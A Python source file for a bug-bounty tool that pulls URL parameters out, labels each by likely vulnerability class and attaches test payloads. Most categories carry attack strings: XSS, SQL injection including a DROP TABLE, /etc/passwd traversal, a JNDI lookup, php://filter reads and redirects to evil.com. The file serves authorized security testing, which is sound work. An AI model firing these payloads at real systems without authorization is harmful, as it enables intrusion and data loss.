#!/usr/bin/env python3
"""Parameter Discovery - Extract all query params from URLs for Bug Bounty"""
import urllib.parse
import re
from typing import Dict, List, Set


class ParameterDiscovery:
    """Extracts and categorizes URL parameters for testing."""

    # Common parameter names seen in bug bounty targets
    COMMON_PARAMS = [
        "id", "user_id", "account_id", "order_id", "product_id", "item_id",
        "page", "limit", "offset", "start", "end", "count", "size",
        "q", "query", "search", "s", "keyword", "term", "filter",
        "sort", "order", "by", "direction", "asc", "desc",
        "token", "auth", "api_key", "key", "secret", "session",
        "redirect", "return", "next", "url", "dest", "destination",
        "callback", "cb", "jsonp", "continue", "forward",
        "role", "type", "level", "permission", "group", "admin",
        "debug", "test", "dev", "mode", "env", "staging",
        "file", "path", "filename", "dir", "folder", "upload",
        "email", "phone", "mobile", "username", "name", "code",
        "amount", "price", "total", "sum", "currency", "discount",
        "start_date", "end_date", "date", "time", "timestamp",
        "format", "output", "render", "view", "template",
        "lang", "locale", "country", "region", "timezone",
        "width", "height", "w", "h", "resize", "quality",
        "version", "v", "build", "revision", "commit",
    ]

    def __init__(self, urls: List[str]):
        self.urls = urls
        self.params: Dict[str, Set[str]] = {
            "id_params": set(),
            "search_params": set(),
            "auth_params": set(),
            "redirect_params": set(),
            "file_params": set(),
            "pagination_params": set(),
            "debug_params": set(),
            "other_params": set(),
        }
        self.injection_points: List[Dict] = []

    def discover(self) -> Dict:
        """Extract all parameters from URLs and categorize them."""
        for url in self.urls:
            parsed = urllib.parse.urlparse(url)
            if not parsed.query:
                continue

            qs = urllib.parse.parse_qs(parsed.query)
            for param, values in qs.items():
                param_lower = param.lower()
                self._categorize_param(param_lower, values, url)

        # Also look for hidden params in path patterns
        self._discover_path_params()

        return {
            "total_injection_points": len(self.injection_points),
            "parameters_by_category": {k: sorted(list(v)) for k, v in self.params.items()},
            "injection_points": self.injection_points[:100],  # Top 100
            "unique_parameters": sorted(list(
                set().union(*self.params.values())
            )),
        }

    def _categorize_param(self, param: str, values: List[str], url: str):
        """Categorize a parameter by its name."""
        # ID parameters
        if any(x in param for x in ["id", "_id", "uuid", "guid", "number", "no", "ref"]):
            self.params["id_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "IDOR / ID Parameter",
                "sample_value": values[0] if values else "",
                "test_payloads": ["1", "2", "../1", "../../../etc/passwd", "'", "\""],
            })
            return

        # Search parameters
        if any(x in param for x in ["q", "query", "search", "s", "keyword", "term", "find"]):
            self.params["search_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "XSS / SQLi / Search",
                "sample_value": values[0] if values else "",
                "test_payloads": [
                    "<script>alert(1)</script>",
                    "' OR '1'='1",
                    "../../../etc/passwd",
                    "{{7*7}}",
                    "${jndi:ldap://x}",
                ],
            })
            return

        # Auth parameters
        if any(x in param for x in ["token", "auth", "api_key", "key", "secret", "session", "jwt", "bearer"]):
            self.params["auth_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "Auth Bypass / Token",
                "sample_value": values[0][:20] + "..." if values and len(values[0]) > 20 else (values[0] if values else ""),
                "test_payloads": ["null", "undefined", "[]", "{}", "true", "false"],
            })
            return

        # Redirect parameters
        if any(x in param for x in ["redirect", "return", "next", "url", "dest", "destination", "callback", "continue", "forward"]):
            self.params["redirect_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "Open Redirect / SSRF",
                "sample_value": values[0] if values else "",
                "test_payloads": [
                    "https://evil.com",
                    "//evil.com",
                    "/\\evil.com",
                    "https://target.com.evil.com",
                    "file:///etc/passwd",
                ],
            })
            return

        # File parameters
        if any(x in param for x in ["file", "path", "filename", "dir", "folder", "upload", "download", "doc"]):
            self.params["file_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "LFI / RFI / Path Traversal",
                "sample_value": values[0] if values else "",
                "test_payloads": [
                    "../../../etc/passwd",
                    "....//....//etc/passwd",
                    "/etc/passwd%00",
                    "php://filter/read=convert.base64-encode/resource=index.php",
                ],
            })
            return

        # Pagination
        if any(x in param for x in ["page", "limit", "offset", "start", "end", "count", "size", "per_page"]):
            self.params["pagination_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "Pagination / DoS",
                "sample_value": values[0] if values else "",
                "test_payloads": ["999999", "-1", "0", "999999999", "1; DROP TABLE users--"],
            })
            return

        # Debug
        if any(x in param for x in ["debug", "test", "dev", "mode", "env", "staging", "trace", "profile"]):
            self.params["debug_params"].add(param)
            self.injection_points.append({
                "url": url, "parameter": param, "type": "Info Disclosure / Debug",
                "sample_value": values[0] if values else "",
                "test_payloads": ["true", "1", "yes", "on", "enabled"],
            })
            return

        # Other
        self.params["other_params"].add(param)
        self.injection_points.append({
            "url": url, "parameter": param, "type": "Unknown / Fuzz",
            "sample_value": values[0] if values else "",
            "test_payloads": ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd", "{{7*7}}"],
        })

    def _discover_path_params(self):
        """Discover parameters embedded in URL paths (REST API style)."""
        for url in self.urls:
            # Patterns like /api/user/123/profile
            rest_pattern = re.findall(r'/[a-zA-Z_-]+/(\d+|[a-f0-9-]{36})/', url)
            if rest_pattern:
                for match in rest_pattern:
                    self.injection_points.append({
                        "url": url,
                        "parameter": f"PATH_PARAM:{match}",
                        "type": "REST ID Parameter",
                        "sample_value": match,
                        "test_payloads": ["1", "2", "../../../etc/passwd", "'", "\"", "true", "false"],
                    })
